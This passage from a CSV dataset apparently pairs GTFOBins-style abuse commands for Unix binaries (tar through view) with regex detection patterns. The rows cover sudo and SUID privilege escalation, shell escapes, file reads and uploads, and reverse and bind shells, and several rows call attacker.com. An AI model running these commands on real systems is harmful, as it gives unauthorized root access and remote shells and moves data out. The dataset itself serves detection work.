tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-xform\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for GNU tar.
tar,file-read,"tar xf ""$LFILE"" -I '/bin/sh -c ""cat 1>&2""'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-I\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for GNU tar.
tar,sudo,sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-checkpoint\s*\-\-checkpoint\-action\s+(?:/bin/(?:sh|bash))),
tar,limited-suid,./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-checkpoint\s*\-\-checkpoint\-action\s+(?:/bin/(?:sh|bash))),
task,shell,task execute /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?task\s+(?:/bin/(?:sh|bash))),
task,sudo,sudo task execute /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?task\s+(?:/bin/(?:sh|bash))),
taskset,shell,taskset 1 /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?taskset\s+(?:/bin/(?:sh|bash))),
taskset,suid,./taskset 1 /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?taskset\s*\-p\s+(?:/bin/(?:sh|bash))),
taskset,sudo,sudo taskset 1 /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?taskset\s+(?:/bin/(?:sh|bash))),
tasksh,shell,"tasksh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tasksh\s+(?:/bin/(?:sh|bash))),
tasksh,limited-suid,"./tasksh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tasksh\s+(?:/bin/(?:sh|bash))),
tasksh,sudo,"sudo tasksh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tasksh\s+(?:/bin/(?:sh|bash))),
tbl,file-read,tbl $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tbl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tbl,suid,./tbl $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tbl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tbl,sudo,sudo tbl $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tbl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tclsh,shell,"tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s+(?:/bin/(?:sh|bash))),
tclsh,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
tclsh,suid,"./tclsh
exec /bin/sh -p <@stdin >@stdout 2>@stderr",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s*\-p\s+(?:/bin/(?:sh|bash))),
tclsh,sudo,"sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s+(?:/bin/(?:sh|bash))),
tcpdump,command,"echo ""$COMMAND"" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tcpdump\s*\-i\s*\-w\s*\-W\s*\-G\s*\-z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tcpdump,sudo,"echo ""$COMMAND"" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tcpdump\s*\-i\s*\-w\s*\-W\s*\-G\s*\-z\s*\-Z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tdbtool,shell,"tdbtool
! /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tdbtool\s+(?:/bin/(?:sh|bash))),
tdbtool,sudo,"sudo tdbtool
! /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tdbtool\s+(?:/bin/(?:sh|bash))),
tdbtool,limited-suid,"./tdbtool
! /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tdbtool\s+(?:/bin/(?:sh|bash))),
tee,file-write,"echo DATA | ./tee -a ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tee,suid,"echo DATA | ./tee -a ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tee,sudo,"echo DATA | sudo tee -a ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
telnet,shell,"telnet $RHOST $RPORT
^]
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",BSD version only. Needs to be connected first.
telnet,reverse-shell,mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
telnet,sudo,"sudo telnet $RHOST $RPORT
^]
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",BSD version only. Needs to be connected first.
telnet,limited-suid,"./telnet $RHOST $RPORT
^]
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",BSD version only. Needs to be connected first.
terraform,file-read,"terraform console
file(""file_to_read"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?terraform\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
terraform,sudo,"sudo terraform console
file(""file_to_read"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?terraform\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
terraform,suid,"./terraform console
file(""file_to_read"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?terraform\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tex,shell,tex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
tex,sudo,sudo tex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
tex,limited-suid,./tex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
tftp,file-upload,"tftp $RHOST
put file_to_send","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a TFTP server.
tftp,file-download,"tftp $RHOST
get file_to_get","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file from a TFTP server.
tftp,suid,"./tftp $RHOST
put file_to_send","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a TFTP server.
tftp,sudo,"sudo tftp $RHOST
put file_to_send","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a TFTP server.
tic,file-read,"tic -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tic,suid,"./tic -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tic,sudo,"sudo tic -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
time,shell,/usr/bin/time /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?time\s+(?:/bin/(?:sh|bash))),
time,suid,./time /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?time\s*\-p\s+(?:/bin/(?:sh|bash))),
time,sudo,sudo /usr/bin/time /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?time\s+(?:/bin/(?:sh|bash))),
timedatectl,shell,"timedatectl list-timezones
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?timedatectl\s+(?:/bin/(?:sh|bash))),
timedatectl,sudo,"sudo timedatectl list-timezones
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?timedatectl\s+(?:/bin/(?:sh|bash))),
timeout,shell,timeout 7d /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?timeout\s+(?:/bin/(?:sh|bash))),
timeout,suid,./timeout 7d /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?timeout\s*\-p\s+(?:/bin/(?:sh|bash))),
timeout,sudo,sudo timeout --foreground 7d /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?timeout\s*\-\-foreground\s+(?:/bin/(?:sh|bash))),
tmate,shell,tmate -c /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+(?:/bin/(?:sh|bash))),
tmate,sudo,sudo tmate -c /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+(?:/bin/(?:sh|bash))),
tmate,limited-suid,./tmate -c /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+(?:/bin/(?:sh|bash))),
tmux,file-read,tmux -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmux\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message."
tmux,shell,tmux,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmux\s+.+),
tmux,shell,tmux -S /path/to/socket_name,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmux\s*\-S\s+.+),Provided to have enough permissions to access the socket.
tmux,sudo,sudo tmux,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmux\s+.+),
top,shell,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
reset",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?top\s*\-e\s+(?:/bin/(?:sh|bash))),
top,sudo,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
reset",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?top\s*\-e\s+(?:/bin/(?:sh|bash))),This requires that the root configuration file is writable and might be used to persist elevated privileges.
torify,shell,torify /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?torify\s+(?:/bin/(?:sh|bash))),
torify,sudo,sudo torify /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?torify\s+(?:/bin/(?:sh|bash))),
torsocks,shell,torsocks /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?torsocks\s+(?:/bin/(?:sh|bash))),
torsocks,sudo,sudo torsocks /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?torsocks\s+(?:/bin/(?:sh|bash))),
troff,file-read,troff $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?troff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
troff,suid,./troff $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?troff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
troff,sudo,sudo troff $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?troff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tshark,shell,"echo 'os.execute(""/bin/sh"")' >$TF
tshark -Xlua_script:$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tshark\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ul,file-read,"ul ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ul\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ul,suid,"./ul ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ul\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ul,sudo,"sudo ul ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ul\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unexpand,file-read,"unexpand -t99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unexpand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unexpand,suid,"./unexpand -t99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unexpand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unexpand,sudo,"sudo unexpand -t99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unexpand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uniq,file-read,"uniq ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uniq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uniq,suid,"./uniq ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uniq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uniq,sudo,"sudo uniq ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uniq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unshare,shell,unshare /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unshare\s+(?:/bin/(?:sh|bash))),
unshare,suid,./unshare -r /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unshare\s*\-r\s+(?:/bin/(?:sh|bash))),
unshare,sudo,sudo unshare /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unshare\s+(?:/bin/(?:sh|bash))),
unsquashfs,sudo,"sudo unsquashfs shell
./squashfs-root/sh -p",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unsquashfs\s*\-p\s+.+),
unsquashfs,suid,"./unsquashfs shell
./squashfs-root/sh -p",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unsquashfs\s*\-p\s+.+),
unzip,sudo,"sudo unzip -K shell.zip
./sh -p",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unzip\s*\-K\s*\-p\s+.+),
unzip,suid,"./unzip -K shell.zip
./sh -p",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unzip\s*\-K\s*\-p\s+.+),
update-alternatives,sudo,"echo DATA >$TF
sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?update\-alternatives\s*\-\-force\s*\-\-install\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Write in `$LFILE` a symlink to `$TF`.
update-alternatives,suid,"echo DATA >$TF
./update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?update\-alternatives\s*\-\-force\s*\-\-install\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Write in `$LFILE` a symlink to `$TF`.
uudecode,file-read,"uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uudecode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uudecode,suid,"uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uudecode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uudecode,sudo,"sudo uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uudecode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uuencode,file-read,"uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uuencode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uuencode,suid,"uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uuencode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uuencode,sudo,"sudo uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uuencode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
vagrant,shell,"cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vagrant\s*\-d\s+(?:/bin/(?:sh|bash))),
vagrant,sudo,"cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vagrant\s*\-d\s+(?:/bin/(?:sh|bash))),
vagrant,suid,"cd $(mktemp -d)
echo 'exec ""/bin/sh -p""' > Vagrantfile
vagrant up",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vagrant\s*\-d\s*\-p\s+(?:/bin/(?:sh|bash))),
valgrind,shell,valgrind /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?valgrind\s+(?:/bin/(?:sh|bash))),
valgrind,sudo,sudo valgrind /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?valgrind\s+(?:/bin/(?:sh|bash))),
varnishncsa,sudo,"sudo varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?varnishncsa\s*\-g\s*\-q\s*\-F\s*\-w\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
varnishncsa,suid,"./varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?varnishncsa\s*\-g\s*\-q\s*\-F\s*\-w\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
vi,shell,vi -c ':!/bin/sh' /dev/null,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vi\s*\-c\s+(?:/bin/(?:sh|bash))),
vi,shell,"vi
:set shell=/bin/sh
:shell",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vi\s+(?:/bin/(?:sh|bash))),
vi,file-write,"vi file_to_write
iDATA
^[
w",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vi\s+.+),
vi,file-read,vi file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vi\s+.+),
vi,sudo,sudo vi -c ':!/bin/sh' /dev/null,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vi\s*\-c\s+(?:/bin/(?:sh|bash))),
view,shell,view -c ':!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:/bin/(?:sh|bash))),
view,shell,"view
:set shell=/bin/sh
:shell",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s+(?:/bin/(?:sh|bash))),
view,shell,"view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.
view,shell,"view -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.+),This requires that `view` is compiled with Lua support.
view,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
view -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
view,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
view -c ':lua local s=require(""socket""); local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.
view,non-interactive-bind-shell,"export LPORT=12345
view -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.
view,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
